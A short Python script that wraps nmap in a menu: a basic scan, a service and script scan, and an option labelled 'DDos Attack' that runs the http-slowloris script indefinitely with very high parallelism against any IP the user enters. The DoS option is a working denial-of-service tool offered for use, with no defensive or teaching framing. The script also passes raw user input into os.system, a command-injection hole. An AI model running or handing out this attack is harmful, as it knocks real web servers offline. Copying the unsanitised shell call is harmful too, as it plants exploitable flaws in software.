import os

def nmap_hello():
    print("""

    -----------------------------------------------
          
                         Nmap
          
    -----------------------------------------------
          
          0-        NMAP Search
          1-        -sC -sV
          2         DDos Attack

    -----------------------------------------------
          
        """)
    
    
    
    
    processNo = input(" Please Enter Process Number: ")
    ip = input(" Please Enter The IP: ")

    if(processNo=="0"):
        os.system("nmap "+ip)
    elif(processNo=="1"):
        os.system("nmap -sC -sV "+ip)
    elif(processNo=="2"):
        os.system("nmap "+ip+" -max-parallelism 10000 -Pn --script http-slowloris --script-args http-slowloris.run forever=True")
    else:
        return nmap_hello


nmap_hello()